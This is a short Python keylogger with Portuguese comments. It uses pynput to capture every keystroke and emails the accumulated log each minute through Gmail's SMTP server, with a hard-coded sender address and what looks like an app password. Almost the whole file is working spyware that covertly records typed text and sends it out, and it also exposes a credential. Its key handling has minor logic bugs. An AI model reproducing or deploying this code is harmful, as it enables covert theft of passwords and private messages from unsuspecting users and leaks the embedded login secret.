from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

#configuraçao de email
email_origem = "t48221716@gmail.com"
email_destino = "t48221716@gmail.com"
senha_email = "oyfo wvnk coor kcjg"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg["SUBJECT"] = "Dados capturados pelo keylogger"
        msg["From"] = email_origem
        msg["To"] = email_destino
        
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email_origem, senha_email)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enciar", e)

        log = ""

    #agendar 
    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        if key == keyboard.Key.enter:
            log += "\n"
        elif keyboard.Key.backspace:
            log += '[<]'
        else:
            pass

with keyboard.Listener(on_press=on_press) as listenner:
    enviar_email()
    listenner.join
